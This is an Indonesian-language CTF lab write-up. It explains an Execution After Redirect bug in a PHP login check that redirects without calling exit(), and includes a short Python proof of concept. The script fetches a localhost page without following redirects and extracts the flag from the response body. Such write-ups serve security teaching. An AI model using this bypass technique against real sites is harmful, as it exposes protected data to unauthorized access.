---
title: Ngga Harus Login
description: Writeup lab Ngga Harus Login
tags:
  - access control
  - CTF
  - PHP
draft: false
---

## Summary
* Vuln Name: Execution After Redirect
* Type: Broken access control / Improper Authorization
* Impact: Information Disclosure / Authorization Bypass
* Severity: High
* functionality: [[authentication]], [[authorization]]

## Metodologi dan Observasi
1. Pada file `index.php`, terdapat pengecekan [[authentication]] yang memeriksa apakah `$_SESSION['user_id']` sudah di-set.
2. Jika belum login, aplikasi mengirimkan header [[HTTP 302]] Redirect ke `login.php` menggunakan fungsi `header("Location: login.php");`.
3. Namun, programmer lupa menambahkan fungsi `exit();` atau `die();` setelah memanggil perintah `header()` tersebut.
4. Akibatnya, meskipun server mengirimkan instruksi kepada browser untuk berpindah halaman, eksekusi kode PHP di bawahnya (yang memuat data sensitif dan _flag_) tetap berjalan dan output HTML-nya tetap dikirimkan ke klien (browser).
5. Kerentanan ini dikenal dengan nama [[Execution After Redirect]]. Browser normal biasanya akan langsung mengikuti redirect sehingga pengguna tidak melihat isi halamannya, namun dengan *tool* khusus (seperti HTTP client python atau curl), kita bisa menahan respons redirect dan membaca *body* dari respons tersebut.

## PoC
Kita bisa menggunakan bahasa pemrograman seperti Python dengan bantuan *library* `requests`, dan mengatur `allow_redirects=False` agar aplikasi tidak secara otomatis mengikuti *redirect*.

```python
import requests
import re

url = "http://localhost:1337/index.php"

# Melakukan GET request namun tidak mengikuti redirect
response = requests.get(url, allow_redirects=False)

# Mengambil isi/body dari response
content = response.text

# Mencari format flag menggunakan Regular Expression
flag_match = re.search(r'pwn\{[^}]+\}', content)

if flag_match:
    print(f"[+] Flag found: {flag_match.group(0)}")
else:
    print("[-] Flag not found in response.")
```

## Impact
Seorang penyerang dapat membaca informasi rahasia atau melakukan _bypass_ pada sistem otorisasi tanpa perlu melakukan proses login sama sekali.
